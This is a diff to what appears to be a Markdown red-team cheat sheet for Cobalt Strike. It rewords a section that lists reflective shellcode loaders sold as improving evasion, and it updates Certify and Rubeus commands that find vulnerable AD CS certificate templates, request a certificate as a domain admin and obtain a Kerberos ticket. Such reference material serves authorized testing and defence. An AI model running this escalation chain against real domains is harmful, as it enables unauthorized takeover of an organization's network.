@@ -34,9 +34,9 @@ A collection of tools used to generate new malleable C2 profiles to use with Cob
 - [SourcePoint](https://github.com/Tylous/SourcePoint)
 
 -----------------------------------------------------------------------------------------
-## Reflective Shellcode Loaders (UDRL)
+## Reflective Shellcode Loaders
 
-Shellcode loaders to add in Cobalt Strike before generating your shellcode which are used to reflectively generate shellcode for added obfuscation, encryption, and ultimately better evasion. 
+Shellcode loaders (UDRLs) to add in Cobalt Strike before generating your shellcode which are used to reflectively generate shellcode for added obfuscation, encryption, and ultimately better evasion. 
 
 - [AceLdr](https://github.com/kyleavery/AceLdr)
 - [TitanLdr](https://github.com/benheise/TitanLdr)
@@ -572,11 +572,14 @@ execute-assembly C:\SharpWeb.exe all
 [Certify - GhostPack](https://github.com/GhostPack/Certify) <br />
 Enumerate and abuse misconfigurations in AD CS <br />
 ```
-# Find vulnerable certificates with Certify.exe
-execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com
+# Find Certificate Authority (CA) servers
+execute-assembly C:\Certify.exe enum-cas --domain LAB.COM
+
+# Find vulnerable certificates
+execute-assembly C:\Certify.exe enum-templates --domain LAB.COM --filter-vulnerable
 
 # Request a new certificate for a vulnerable template from the above output 
-execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTemplate /altname:DomainAdminUser1
+execute-assembly C:\Certify.exe request --ca lab.com\ops-dc01 --template VulnTemplate --upn DomainAdminAccount
 
 # Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus
 execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
